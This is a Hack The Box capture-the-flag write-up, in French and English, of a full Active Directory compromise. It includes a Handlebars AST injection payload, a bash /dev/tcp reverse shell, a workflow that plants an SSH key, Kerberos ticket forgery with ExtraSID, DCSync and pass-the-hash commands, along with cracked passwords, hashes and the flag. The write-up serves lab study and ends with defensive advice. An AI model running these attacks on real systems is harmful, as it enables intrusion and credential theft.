# Hack The Box — DarkZeroReturns

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-red)
![Operating System](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
![Category](https://img.shields.io/badge/Category-Active%20Directory%20%2F%20Kerberos%20%2F%20Trusts-purple)

> **Active-machine material — private only. Do not publish until DarkZeroReturns has retired.**

## Write-up complet, pédagogique et reproductible

> **Spoilers complets.** Ce document décrit toute la chaîne d’exploitation, depuis l’énumération initiale jusqu’à la récupération de `root.txt`.
>
> Ce guide est destiné exclusivement à un laboratoire autorisé Hack The Box. Les adresses IP externes changent à chaque redémarrage d’instance : remplacez `<TARGET_IP>` par l’adresse affichée par HTB et `<TUN0_IP>` par votre adresse VPN.

---

## Machine Information

| Field | Value |
|---|---|
| Machine | DarkZeroReturns |
| Platform | Hack The Box |
| OS | Windows / Active Directory with Linux pivot host |
| Difficulty | Hard |
| Main Techniques | Handlebars AST injection, reverse shell, credential recovery, SOCKS pivoting, Kerberos/SSPI, Gitea Actions abuse, AD object creation, `ksu.mit`, SQL backup recovery, DCSync, forest trust abuse, ExtraSID, Pass-the-Hash |
| Initial Foothold | Handlebars AST injection leading to command execution on SRV01 |
| Main Pivot | `josh` → Gitea SSPI → workflow execution as `svc-runner` |
| Linux Root | Kerberos principal creation + SUID `ksu.mit` |
| Domain Compromise | Celia Domain Admin path, trust-key abuse, machine-account DCSync, Administrator hash recovery |

## CVEs and Vulnerabilities Used

### CVE-2026-33937 — Handlebars AST Injection / Remote Code Execution

- **Stage:** Initial access / foothold
- **Target:** Node.js web application using Handlebars
- **Impact in DarkZeroReturns:** the application accepted a JSON object representing a Handlebars AST and passed it to the compilation path. A crafted AST allowed JavaScript command execution and produced the initial reverse shell on SRV01.
- **Why it was relevant:** public advisories for CVE-2026-33937 describe an RCE condition where `Handlebars.compile()` accepts a pre-parsed AST object and unsafe AST fields can be emitted into generated JavaScript.
- **Reference:** NVD — <https://nvd.nist.gov/vuln/detail/CVE-2026-33937>

### Related Handlebars RCE context — CVE-2021-23369

- **Stage:** Related context for untrusted Handlebars compilation
- **Target:** Handlebars versions before `4.7.7`
- **Usage note:** this older CVE documents Handlebars RCE risk when untrusted templates are compiled with dangerous options. The primitive used in this lab matches the AST-object injection pattern more directly than this older template-compilation issue.
- **Reference:** NVD — <https://nvd.nist.gov/vuln/detail/CVE-2021-23369>

### Gitea Actions workflow trust abuse

- **Stage:** `josh` → `workflow` → `svc-runner`
- **Impact in DarkZeroReturns:** authenticated access to Gitea through Kerberos/SSPI allowed workflow content to be submitted and executed by the Gitea runner as `svc-runner`.
- **Note:** no CVE was mapped during the lab. This was an authorization/workflow trust issue.

### Kerberos, AD ACL and forest-trust abuse

- **Stage:** root Linux and domain compromise
- **Impact in DarkZeroReturns:** the `svc-runner` Kerberos cache and `ServiceHandler` rights allowed account creation; `ksu.mit` mapped the created principal to local root; later, trust-key and ExtraSID abuse enabled cross-forest access and final DCSync.
- **Note:** these were chained configuration and trust-boundary weaknesses, not a single CVE.

---

## 1. Présentation de la machine

- **Nom :** DarkZeroReturns
- **Plateforme :** Hack The Box
- **Difficulté officielle :** Hard
- **Domaines internes :** `darkzero.ext` et `darkzero.htb`

### Chaîne d’attaque

```text
Application web
  ↓ Injection AST Handlebars
Shell darkzero sur SRV01
  ↓ Identifiants MySQL + crack bcrypt
SSH comme josh
  ↓ Kerberos/SSPI
Accès Gitea
  ↓ Événement CI/CD insuffisamment protégé
Exécution de code comme svc-runner
  ↓ Cache Kerberos + ACL CREATE_CHILD
Création d’un principal AD nommé root
  ↓ ksu.mit SUID
root Linux sur SRV01
  ↓ Ancienne sauvegarde SQL
Mot de passe de Celia
  ↓ Celia est Domain Admin
Compromission de darkzero.ext
  ↓ Clés de la relation de confiance
Ticket inter-forêts vers darkzero.htb
  ↓ ExtraSID InfrastructureAdministrators
Droits de sauvegarde sur DC01
  ↓ SAM + SYSTEM + SECURITY
Secret du compte DC01$
  ↓ DCSync
Hash d’Administrator
  ↓ Pass-the-Hash SMB
root.txt
```

---

## 2. Topologie du laboratoire

```text
Kali
  |
  | SSH / SOCKS
  v
SRV01 Linux
IP interne : 172.16.20.3
IP externe : <TARGET_IP>
  |
  +---- DC02 / Gitea
  |     172.16.20.2
  |     dc02.darkzero.ext
  |     domaine darkzero.ext
  |
  +---- DC01
        172.16.20.1
        dc01.darkzero.htb
        domaine darkzero.htb
```

Ajouter les noms utiles dans `/etc/hosts` :

```text
<TARGET_IP> dzcampaigns.htb
172.16.20.2 dc02.darkzero.ext dc02 gitea.darkzero.ext
172.16.20.1 dc01.darkzero.htb dc01 darkzero.htb
```

---

## 3. Préparation des outils

Outils employés :

```text
nmap, curl, Burp Suite, netcat, john, ssh, proxychains4,
bloodyAD, rpcclient, NetExec, Impacket, ldapsearch,
kinit, klist et kvno
```

### Installer une version récente d’Impacket

La version fournie par Kali ne possédait pas encore l’option `-just-trust-keys`.

```bash
cd ~/hackthebox/DarkZeroReturns

python3 -m venv impacket-trust
source impacket-trust/bin/activate

python3 -m pip install --upgrade pip
python3 -m pip install 'git+https://github.com/fortra/impacket.git'
```

Vérification :

```bash
secretsdump.py -h | grep -i trust
```

Installation permanente recommandée après le lab :

```bash
sudo apt install -y pipx git
pipx ensurepath
exec zsh
pipx install 'git+https://github.com/fortra/impacket.git'
```

---

## 4. Énumération initiale

```bash
nmap -Pn -p- --min-rate 3000 -oN nmap-all.txt <TARGET_IP>
nmap -Pn -sC -sV -p22,80 -oN nmap-services.txt <TARGET_IP>
```

Services importants :

```text
22/tcp  SSH
80/tcp  HTTP
```

L’application web utilisait Node.js et Handlebars.

### Pourquoi Handlebars était important

Handlebars transforme un template en code exécutable :

```text
Texte Handlebars
      ↓ parsing
Arbre AST
      ↓ compilation
Fonction JavaScript
```

L’application acceptait une structure JSON représentant directement l’AST. Elle faisait donc confiance à une structure interne qui aurait dû être construite uniquement par le serveur.

---

## 5. Injection AST Handlebars et RCE

L’application recevait notamment `campaign_message`, puis le transmettait à Handlebars. Au lieu d’envoyer une chaîne, on pouvait envoyer un AST spécialement construit.

L’idée était :

```text
L’application pense recevoir une description de template
                       ↓
Nous glissons du JavaScript dans cette description
                       ↓
Handlebars compile l’objet
                       ↓
Notre JavaScript arrive dans la fonction générée
                       ↓
Node.js l’exécute
```

### PoC avec `id`

```json
{
  "type": "Program",
  "body": [
    {
      "type": "MustacheStatement",
      "path": {
        "type": "PathExpression",
        "data": false,
        "depth": 0,
        "parts": ["lookup"],
        "original": "lookup",
        "loc": null
      },
      "params": [
        {
          "type": "PathExpression",
          "data": false,
          "depth": 0,
          "parts": [],
          "original": "this",
          "loc": null
        },
        {
          "type": "NumberLiteral",
          "value": "{},{})) + process.getBuiltinModule('child_process').execFileSync('/usr/bin/id').toString() //",
          "original": 1,
          "loc": null
        }
      ],
      "escaped": true,
      "strip": {"open": false, "close": false},
      "loc": null
    }
  ]
}
```

Requête type :

```http
POST /character/<ID> HTTP/1.1
Host: dzcampaigns.htb
Content-Type: application/json
Cookie: <SESSION>

{
  "name": "test",
  "campaign_message": {
    "...": "AST CI-DESSUS"
  }
}
```

L’ID, le cookie et les champs obligatoires doivent être adaptés à la session.

### Reverse shell

Sur Kali :

```bash
ip addr show tun0
nc -lvnp 9001
```

Dans l’AST, remplacer `id` par :

```javascript
process
  .getBuiltinModule('child_process')
  .execFileSync(
    '/bin/bash',
    ['-c', 'bash -i >& /dev/tcp/<TUN0_IP>/9001 0>&1']
  )
  .toString()
```

Une fois la requête déclenchée :

```bash
whoami
id
hostname
```

Résultat :

```text
darkzero
SRV01
```

### Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Puis `Ctrl+Z`, et sur Kali :

```bash
stty raw -echo; fg
```

Dans le shell :

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 140
```

---

## 6. Récupération de Josh

Chercher les configurations :

```bash
find / -maxdepth 4 -type f \(   -name '.env' -o   -name 'config.*' -o   -name '*database*' -o   -name '*db*' \) 2>/dev/null

grep -RniE 'DB_HOST|DB_USER|DB_PASS|MYSQL|DATABASE_URL|password' /var/www /opt /home 2>/dev/null
```

Connexion MySQL :

```bash
mysql -h 127.0.0.1 -u <DB_USER> -p'<DB_PASSWORD>'
```

Puis :

```sql
SHOW DATABASES;
USE <DATABASE>;
SHOW TABLES;
SELECT * FROM users;
```

Crack du bcrypt de Josh :

```bash
echo '<JOSH_BCRYPT>' > josh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
john --show josh.hash
```

Résultat :

```text
josh:Rangers1
```

Connexion stable :

```bash
ssh josh@<TARGET_IP>
```

---

## 7. Pivot réseau

Ouvrir un tunnel SOCKS et le laisser actif :

```bash
ssh -N -D 1082   -o ExitOnForwardFailure=yes   -o ServerAliveInterval=30   -o ServerAliveCountMax=3   josh@<TARGET_IP>
```

Créer `proxychains-dz.conf` :

```text
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1082
```

Tests :

```bash
proxychains4 -q -f proxychains-dz.conf nc -vz 172.16.20.2 389
proxychains4 -q -f proxychains-dz.conf nc -vz 172.16.20.1 88
proxychains4 -q -f proxychains-dz.conf nc -vz 172.16.20.1 445
```

### Synchronisation de l’heure

Kerberos refuse les tickets lorsqu’il existe trop de décalage entre les horloges.

```bash
sudo timedatectl set-ntp false
REMOTE_EPOCH=$(ssh josh@<TARGET_IP> 'date +%s')
sudo date -s "@$REMOTE_EPOCH"
```

---

## 8. Authentification Kerberos/SSPI sur Gitea

Sur SRV01 :

```bash
kinit josh@DARKZERO.EXT
klist
```

Ticket attendu :

```text
krbtgt/DARKZERO.EXT@DARKZERO.EXT
```

Vérifier le SPN HTTP :

```bash
kvno HTTP/gitea.darkzero.ext
```

Vérifier SSPI :

```bash
curl -s http://gitea.darkzero.ext:3000/user/login |
grep -i -B5 -A5 SSPI
```

Connexion :

```bash
curl --negotiate -u :   -c /tmp/gitea.cookies   -b /tmp/gitea.cookies   -L   'http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1'
```

La session résultante appartenait à :

```text
darkzero-ext_josh
```

### Explication simple

```text
Josh possède un badge Kerberos.
Gitea demande au domaine si le badge est vrai.
Le domaine confirme.
Gitea ouvre la session sans mot de passe Gitea séparé.
```

---

## 9. De Josh à `svc-runner` avec Gitea Actions

### Ce qui s’est réellement passé

Josh n’a jamais été transformé en `svc-runner`.

```text
Josh contrôle un dépôt ou une Pull Request
          ↓
Un workflow Gitea Actions est déclenché
          ↓
Le runner lit le YAML
          ↓
Le runner tourne déjà comme svc-runner
          ↓
Nos commandes s’exécutent comme svc-runner
```

Nous n’avons donc pas volé le mot de passe de `svc-runner`. Nous avons contrôlé le programme qui exécutait déjà des commandes sous cette identité.

### Découverte du runner

```bash
ps auxww | grep -i gitea
ls -ld /opt/gitea-runner
```

Le dossier appartenait à `svc-runner`.

### Protection insuffisante

Le dépôt protégeait une Pull Request normale, mais pas tous les événements.

```text
pull_request
→ protégé

pull_request_review_comment
→ oublié
```

### Workflow pédagogique

Créer une clé :

```bash
ssh-keygen -t ed25519 -f ~/.ssh/dz_svc -N ''
cat ~/.ssh/dz_svc.pub
```

Dans le fork, créer `.gitea/workflows/pwn.yml` :

```yaml
name: runner-check

on:
  pull_request_review_comment:
    types: [created]

jobs:
  runner-check:
    runs-on: ubuntu-latest

    steps:
      - name: Show runner identity
        shell: bash
        run: |
          id
          whoami
          hostname

      - name: Add SSH key
        shell: bash
        run: |
          mkdir -p /home/svc-runner/.ssh
          chmod 700 /home/svc-runner/.ssh
          echo '<CONTENU_DE_DZ_SVC.PUB>' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
```

Procédure :

1. forker `DarkZero/DarkZero-Campaigns` ;
2. ajouter le workflow au fork ;
3. ouvrir une Pull Request vers le dépôt original ;
4. publier un commentaire de revue ;
5. vérifier les logs de l’Action ;
6. constater que `id` retourne `svc-runner`.

Connexion :

```bash
ssh -i ~/.ssh/dz_svc svc-runner@<TARGET_IP>
```

---

## 10. Cache Kerberos de `svc-runner`

Le processus runner possédait :

```text
KRB5CCNAME=/tmp/krb5cc_gitea
```

Copie :

```bash
scp -i ~/.ssh/dz_svc   svc-runner@<TARGET_IP>:/tmp/krb5cc_gitea   ./svc-runner.ccache
```

Chargement :

```bash
export KRB5CCNAME="$PWD/svc-runner.ccache"
klist -ef
```

Tickets observés :

```text
Default principal: svc-runner@DARKZERO.EXT
krbtgt/DARKZERO.EXT@DARKZERO.EXT
ldap/dc02.darkzero.ext@DARKZERO.EXT
```

Un `.ccache` est un portefeuille de tickets. Sa possession permet d’utiliser l’identité Kerberos du compte sans connaître son mot de passe.

---

## 11. ACL Active Directory de `svc-runner`

Groupes :

```bash
proxychains4 -q -f proxychains-dz.conf bloodyAD   -d darkzero.ext   -u svc-runner   -k kdc=172.16.20.2 ccache="$PWD/svc-runner.ccache"   -H dc02.darkzero.ext   -i 172.16.20.2   get membership svc-runner
```

Groupe important :

```text
ServiceHandler
```

Droits d’écriture :

```bash
proxychains4 -q -f proxychains-dz.conf bloodyAD   -d darkzero.ext   -u svc-runner   -k kdc=172.16.20.2 ccache="$PWD/svc-runner.ccache"   -H dc02.darkzero.ext   -i 172.16.20.2   get writable   --right CHILD   --detail
```

Résultat :

```text
distinguishedName: OU=GiteaMigration,DC=darkzero,DC=ext
group: CREATE_CHILD
user: CREATE_CHILD
```

Traduction :

```text
svc-runner, via ServiceHandler,
peut créer un utilisateur ou un groupe
dans l’OU GiteaMigration.
```

---

## 12. Création du principal AD `root`

La syntaxe de `bloodyAD` peut varier légèrement selon la version. La logique employée était :

```bash
proxychains4 -q -f proxychains-dz.conf bloodyAD   -d darkzero.ext   -u svc-runner   -k kdc=172.16.20.2 ccache="$PWD/svc-runner.ccache"   -H dc02.darkzero.ext   -i 172.16.20.2   add user root 'R00tMigration2026!'   --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'
```

Vérifier avec :

```bash
bloodyAD add user -h
```

Puis vérifier l’objet :

```bash
proxychains4 -q -f proxychains-dz.conf bloodyAD   -d darkzero.ext   -u svc-runner   -k kdc=172.16.20.2 ccache="$PWD/svc-runner.ccache"   -H dc02.darkzero.ext   -i 172.16.20.2   get object root   --attr distinguishedName,sAMAccountName,userAccountControl
```

---

## 13. `ksu.mit` SUID et root Linux

Chercher les SUID :

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binaire intéressant :

```text
/usr/bin/ksu.mit
```

Obtenir un ticket pour le compte créé :

```bash
export KRB5CCNAME=/tmp/root.ccache
kinit root@DARKZERO.EXT
```

Mot de passe :

```text
R00tMigration2026!
```

Puis :

```bash
/usr/bin/ksu.mit root
id
whoami
```

Résultat :

```text
uid=0(root)
root
```

### Pourquoi cela marche

```text
1. svc-runner peut créer un principal AD nommé root.
2. Kerberos confirme que nous contrôlons root@DARKZERO.EXT.
3. La configuration Unix accepte ce principal pour le compte local root.
4. ksu.mit est SUID root.
5. ksu peut donc changer l’UID en 0.
```

La faiblesse est la combinaison d’une ACL AD trop permissive, d’un mapping Kerberos/Unix dangereux et d’un binaire SUID.

---

## 14. Sauvegarde SQL et Celia

Aucun `root.txt` final n’était présent sur SRV01.

Dans `/root` :

```text
/root/darkzero_campaigns_backup.sql
```

Inspection :

```bash
grep -n "INSERT INTO \`users\`"   /root/darkzero_campaigns_backup.sql
```

Hash de Celia :

```text
$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC
```

Crack :

```bash
echo '$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC'   > celia.hash

john --wordlist=/usr/share/wordlists/rockyou.txt celia.hash
john --show celia.hash
```

Résultat :

```text
celia:babygurl13
```

Leçon : une ancienne sauvegarde peut conserver des secrets que l’application active n’expose plus.

---

## 15. Celia est Domain Admin

```bash
proxychains4 -q -f proxychains-dz.conf nxc winrm 172.16.20.2   -d darkzero.ext   -u celia   -p 'babygurl13'
```

Résultat :

```text
(Pwn3d!)
```

Celia était membre de `Domain Admins` dans `darkzero.ext`.

---

## 16. DCSync de `darkzero.ext`

```bash
mkdir -p dcsync_ext
```

```bash
proxychains4 -q -f proxychains-dz.conf secretsdump.py   -just-dc   -dc-ip 172.16.20.2   -outputfile dcsync_ext/darkzero_ext   'darkzero.ext/celia:babygurl13@dc02.darkzero.ext'
```

Un DCSync demande les secrets via les mécanismes de réplication Active Directory.

---

## 17. Relation de confiance

La forêt source faisait confiance à `darkzero.htb`.

Propriétés observées :

```text
trustDirection: 3
→ bidirectionnelle

trustAttributes: 8
→ forest transitive

SIDFilteringForestAware: False
SIDFilteringQuarantined: False
SelectiveAuthentication: False
```

Cible finale :

```text
dc01.darkzero.htb
172.16.20.1
```

---

## 18. Clés du trust

```bash
proxychains4 -q -f proxychains-dz.conf secretsdump.py   -just-trust-keys   -dc-ip 172.16.20.2   'darkzero.ext/celia:babygurl13@dc02.darkzero.ext' |
tee trust-keys.txt
```

Clé utile :

```text
darkzero.htb (Incoming):aes256-cts-hmac-sha1-96:
f133c2e21dca5ab112d32a16c1ea3927ac46dc4d6845b3ee806f19472587fa98
```

Pour le ticket `krbtgt/darkzero.htb@DARKZERO.EXT`, il fallait la clé **Incoming AES256**, pas la clé Outgoing, pas la clé du compte `darkzero$` et pas RC4.

---

## 19. Groupe cible à RID élevé

Énumération RPC :

```bash
proxychains4 -q -f proxychains-dz.conf rpcclient   -W DARKZERO-EXT   -U 'celia%babygurl13'   172.16.20.1   -c 'enumdomgroups'
```

Groupes à RID élevé :

```text
DnsUpdateProxy               RID 1102
InfrastructureAdministrators RID 1603
```

SID de la forêt cible :

```text
S-1-5-21-2899195410-1848524783-1547768515
```

SID complet :

```text
S-1-5-21-2899195410-1848524783-1547768515-1603
```

Les groupes standards comme `Domain Admins-512` et `Enterprise Admins-519` sont connus et filtrables. Le groupe personnalisé à RID élevé était le bon `ExtraSID`.

---

## 20. Referral ticket inter-forêts

```bash
TRUST_AES='f133c2e21dca5ab112d32a16c1ea3927ac46dc4d6845b3ee806f19472587fa98'
SOURCE_SID='S-1-5-21-2850783758-1231244658-2051857529'
INFRA_SID='S-1-5-21-2899195410-1848524783-1547768515-1603'
```

```bash
rm -f celia.ccache
rm -f celia@cifs_dc01.darkzero.htb*.ccache
```

```bash
ticketer.py   -aesKey "$TRUST_AES"   -domain-sid "$SOURCE_SID"   -domain darkzero.ext   -user-id 1109   -groups 513   -extra-sid "$INFRA_SID"   -spn krbtgt/darkzero.htb   celia
```

```bash
export KRB5CCNAME="$PWD/celia.ccache"
klist -ef
```

Ticket attendu :

```text
krbtgt/darkzero.htb@DARKZERO.EXT
```

---

## 21. Ticket CIFS pour DC01

```bash
proxychains4 -q -f proxychains-dz.conf getST.py   -k   -no-pass   -dc-ip 172.16.20.1   -spn cifs/dc01.darkzero.htb   'darkzero.htb/celia'
```

Charger le nouveau cache :

```bash
ST=$(ls -t celia@cifs_dc01.darkzero.htb*.ccache | head -n1)
export KRB5CCNAME="$PWD/$ST"
klist -ef
```

Ticket attendu :

```text
cifs/dc01.darkzero.htb@DARKZERO.HTB
```

---

## 22. SMB inter-forêts

Utiliser le domaine source de Celia :

```bash
proxychains4 -q -f proxychains-dz.conf smbclient.py   -k   -no-pass   -target-ip 172.16.20.1   'darkzero.ext/celia@dc01.darkzero.htb'
```

Dans le client :

```text
shares
use C$
ls
```

Les partages étaient visibles, mais :

```text
cd Users\Administrator\Desktop
```

retournait `STATUS_ACCESS_DENIED`.

Cela prouvait que le ticket était valide, mais que `InfrastructureAdministrators` donnait un privilège spécialisé, pas tous les droits administrateur.

---

## 23. Sauvegarde des ruches

```bash
proxychains4 -q -f proxychains-dz.conf reg.py   -k   -no-pass   -dc-ip 172.16.20.1   -target-ip 172.16.20.1   'darkzero.ext/celia@dc01.darkzero.htb'   backup   -o 'C:\Windows\Temp'
```

Résultat :

```text
Saved HKLM\SAM to C:\Windows\Temp\SAM.save
Saved HKLM\SYSTEM to C:\Windows\Temp\SYSTEM.save
Saved HKLM\SECURITY to C:\Windows\Temp\SECURITY.save
```

Rôle des ruches :

```text
SYSTEM   → reconstruction de la bootKey
SAM      → comptes locaux
SECURITY → secrets LSA, dont $MACHINE.ACC
```

---

## 24. Téléchargement direct malgré l’ACL

```bash
proxychains4 -q -f proxychains-dz.conf smbclient.py   -k   -no-pass   -target-ip 172.16.20.1   'darkzero.ext/celia@dc01.darkzero.htb'
```

Dans le client :

```text
use C$
get /Windows/Temp/SAM.save
get /Windows/Temp/SYSTEM.save
get /Windows/Temp/SECURITY.save
lls
exit
```

`cd Windows\Temp` échouait, mais `get` avec le chemin exact fonctionnait.

Pourquoi :

```text
reg.py demande au service RemoteRegistry de créer les fichiers ;
smbclient tente de parcourir le dossier avec le jeton de Celia.
```

Le service pouvait écrire, alors que Celia ne pouvait pas lister. Connaître le nom exact permettait d’ouvrir directement le fichier.

---

## 25. Secret de `DC01$`

```bash
secretsdump.py   -sam SAM.save   -system SYSTEM.save   -security SECURITY.save   LOCAL |
tee dc01-local-secrets.txt
```

Sortie :

```text
[*] $MACHINE.ACC
DARKZERO\DC01$:aad3b435b51404eeaad3b435b51404ee:
686d06e419d66abfa5fefac2618cdcea:::
```

Hash NT du compte machine :

```text
686d06e419d66abfa5fefac2618cdcea
```

Le compte `DC01$` est celui du contrôleur de domaine lui-même et possède des capacités de réplication.

---

## 26. DCSync avec `DC01$`

```bash
unset KRB5CCNAME
MACHINE_NT='686d06e419d66abfa5fefac2618cdcea'
```

```bash
proxychains4 -q -f proxychains-dz.conf secretsdump.py   -hashes ":$MACHINE_NT"   -just-dc-user 'darkzero/Administrator'   -dc-ip 172.16.20.1   'darkzero.htb/DC01$@172.16.20.1' |
tee administrator-hash.txt
```

Hash obtenu :

```text
Administrator:500:
aad3b435b51404eeaad3b435b51404ee:
4d470bb7497acf3f5f5c2a11872e02ac:::
```

---

## 27. Pass-the-Hash et flag

```bash
ADMIN_NT='4d470bb7497acf3f5f5c2a11872e02ac'
```

```bash
proxychains4 -q -f proxychains-dz.conf smbclient.py   -hashes ":$ADMIN_NT"   -target-ip 172.16.20.1   'darkzero.htb/Administrator@dc01.darkzero.htb'
```

Dans SMB :

```text
shares
use C$
cd Users\Administrator\Desktop
ls
get root.txt
exit
```

Puis :

```bash
cat root.txt
```

Flag observé :

```text
baecc46bc2191b6584d9f2e0baf76ce8
```

---

## 28. Pourquoi les essais précédents ont échoué

## 28.1 Bind LDAP simple de Celia vers la forêt cible

```bash
ldapsearch -x   -H ldaps://dc01.darkzero.htb:636   -D 'celia@darkzero.ext'   -w 'babygurl13'
```

Erreur :

```text
Invalid credentials — data 52e
```

`-x` fait un bind simple par mot de passe. Celia n’existe pas localement dans `darkzero.htb`. La confiance inter-forêts doit être utilisée avec Kerberos, pas avec un bind LDAP simple.

## 28.2 `KDC_ERR_WRONG_REALM`

`getST.py` lancé avec `darkzero.ext/celia` ne sélectionnait pas correctement le referral présent dans le cache.

Correction :

```text
darkzero.htb/celia
```

pour la phase `getST.py`.

## 28.3 `KDC_ERR_ETYPE_NOSUPP`

Un ticket RC4 ou une clé inadaptée était utilisé. Le KDC attendait AES.

Correction : clé `Incoming AES256`.

## 28.4 `KRB_AP_ERR_BAD_INTEGRITY`

Le ticket était signé/chiffré avec la mauvaise clé : clé du compte `darkzero$`, clé Outgoing ou ancienne clé.

Correction : la clé `darkzero.htb (Incoming):aes256`.

## 28.5 ExtraSID `Enterprise Admins-519`

Les groupes standards privilégiés sont filtrables à la frontière du trust.

Correction : `InfrastructureAdministrators-1603`.

## 28.6 `STATUS_MORE_PROCESSING_REQUIRED`

Avec :

```text
darkzero.htb/celia@dc01.darkzero.htb
```

Impacket mélangeait le realm client et le realm du service.

Correction pour `smbclient.py` :

```text
darkzero.ext/celia@dc01.darkzero.htb
```

## 28.7 `STATUS_BAD_NETWORK_NAME`

La commande tapée était :

```text
use C§
```

au lieu de :

```text
use C$
```

Il s’agissait simplement d’une faute de frappe.

## 28.8 Accès refusé au profil Administrator

Le ticket fonctionnait puisque les partages et `C$` étaient visibles. Le refus montrait uniquement que le groupe forgé n’était pas un administrateur local général.

## 28.9 DCSync direct avec Celia

Erreur :

```text
ERROR_DS_DRA_BAD_DN
```

Dans ce contexte inter-realm, `secretsdump.py` mélangeait le principal source `celia@DARKZERO.EXT` et l’objet cible `DC=darkzero,DC=htb`.

Ce n’était pas une erreur de mot de passe, ni un simple refus de permission. La route correcte consistait à sauvegarder les ruches, récupérer `DC01$`, puis faire le DCSync comme compte machine.

## 28.10 Modifier `secretsdump.py`

La modification testée ne changeait pas la valeur réellement utilisée plus loin pour construire la requête DRS. Elle n’a donc pas résolu `BAD_DN`. Il fallait restaurer la bibliothèque originale.

## 28.11 `reg.py` réussit mais `cd Windows\Temp` échoue

RemoteRegistry crée le fichier avec les droits du service. La navigation SMB utilise les droits de Celia. Les deux opérations n’utilisent pas le même contexte de sécurité.

## 28.12 `Connection refused`

Cette erreur est apparue lorsque l’instance HTB avait expiré ou que le tunnel était tombé.

```text
BAD_INTEGRITY / WRONG_REALM / ETYPE_NOSUPP
→ problème Kerberos

connection refused / timeout
→ problème réseau, tunnel ou instance
```

---

## 29. Checklist condensée

## Tunnel

```bash
ssh -N -D 1082 josh@<TARGET_IP>
```

## Celia

```bash
proxychains4 -q -f proxychains-dz.conf nxc winrm 172.16.20.2 -d darkzero.ext -u celia -p 'babygurl13'
```

## Trust

```bash
proxychains4 -q -f proxychains-dz.conf secretsdump.py -just-trust-keys -dc-ip 172.16.20.2 'darkzero.ext/celia:babygurl13@dc02.darkzero.ext'
```

## Referral

```bash
ticketer.py -aesKey "$TRUST_AES" -domain-sid S-1-5-21-2850783758-1231244658-2051857529 -domain darkzero.ext -user-id 1109 -groups 513 -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 -spn krbtgt/darkzero.htb celia
```

## CIFS

```bash
export KRB5CCNAME="$PWD/celia.ccache"

proxychains4 -q -f proxychains-dz.conf getST.py -k -no-pass -dc-ip 172.16.20.1 -spn cifs/dc01.darkzero.htb 'darkzero.htb/celia'
```

## Registry

```bash
export KRB5CCNAME="$PWD/celia@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache"

proxychains4 -q -f proxychains-dz.conf reg.py -k -no-pass -dc-ip 172.16.20.1 -target-ip 172.16.20.1 'darkzero.ext/celia@dc01.darkzero.htb' backup -o 'C:\Windows\Temp'
```

## Téléchargement

```bash
proxychains4 -q -f proxychains-dz.conf smbclient.py -k -no-pass -target-ip 172.16.20.1 'darkzero.ext/celia@dc01.darkzero.htb'
```

```text
use C$
get /Windows/Temp/SAM.save
get /Windows/Temp/SYSTEM.save
get /Windows/Temp/SECURITY.save
exit
```

## Secret machine

```bash
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

## DCSync final

```bash
unset KRB5CCNAME

proxychains4 -q -f proxychains-dz.conf secretsdump.py -hashes ":$MACHINE_NT" -just-dc-user 'darkzero/Administrator' -dc-ip 172.16.20.1 'darkzero.htb/DC01$@172.16.20.1'
```

## Flag

```bash
proxychains4 -q -f proxychains-dz.conf smbclient.py -hashes ":$ADMIN_NT" -target-ip 172.16.20.1 'darkzero.htb/Administrator@dc01.darkzero.htb'
```

```text
use C$
cd Users\Administrator\Desktop
get root.txt
exit
```

---

## 30. Mesures défensives

## Web

- mettre Handlebars à jour ;
- ne jamais accepter un AST fourni par le client ;
- valider strictement le type de `campaign_message` ;
- surveiller les processus enfants de Node.js.

## CI/CD

- protéger tous les événements de workflow ;
- ne pas exécuter automatiquement le code d’un fork non approuvé ;
- isoler les runners dans des environnements éphémères ;
- ne pas donner au compte runner des ACL AD puissantes ;
- ne pas laisser de TGT réutilisable dans un fichier accessible.

## Active Directory et Kerberos

- retirer `CREATE_CHILD` à `ServiceHandler` ;
- empêcher les mappings arbitraires vers le compte Unix root ;
- auditer `.k5login`, PAM et les règles Kerberos ;
- appliquer un filtrage SID strict sur les trusts ;
- surveiller les DCSync et appels DRSUAPI.

## Sauvegardes

- chiffrer les sauvegardes ;
- restreindre leur lecture ;
- définir une rétention ;
- faire tourner les mots de passe après exposition.

## Windows

- limiter les droits de sauvegarde ;
- restreindre RemoteRegistry ;
- surveiller `RegSaveKey` ;
- empêcher la lecture des ruches exportées ;
- renouveler le secret d’un compte machine compromis.

---

## 31. Valeurs observées pendant la résolution

> Ces valeurs peuvent changer après une réinitialisation. Les redécouvrir est plus fiable que les réutiliser aveuglément.

```text
josh:Rangers1
celia:babygurl13
root:R00tMigration2026!

SID darkzero.ext :
S-1-5-21-2850783758-1231244658-2051857529

RID Celia :
1109

SID darkzero.htb :
S-1-5-21-2899195410-1848524783-1547768515

InfrastructureAdministrators :
RID 1603
S-1-5-21-2899195410-1848524783-1547768515-1603

Trust Incoming AES256 :
f133c2e21dca5ab112d32a16c1ea3927ac46dc4d6845b3ee806f19472587fa98

Hash NT DC01$ :
686d06e419d66abfa5fefac2618cdcea

Hash NT Administrator :
4d470bb7497acf3f5f5c2a11872e02ac

root.txt :
baecc46bc2191b6584d9f2e0baf76ce8
```

---

## 32. Résumé pédagogique

## Pourquoi nous sommes devenus `svc-runner`

```text
Josh a écrit des instructions.
Gitea a donné ces instructions au runner.
Le runner travaillait déjà comme svc-runner.
Le runner a donc exécuté nos commandes comme svc-runner.
```

## Pourquoi nous sommes devenus root Linux

```text
svc-runner pouvait créer un utilisateur AD.
Nous avons créé un principal appelé root.
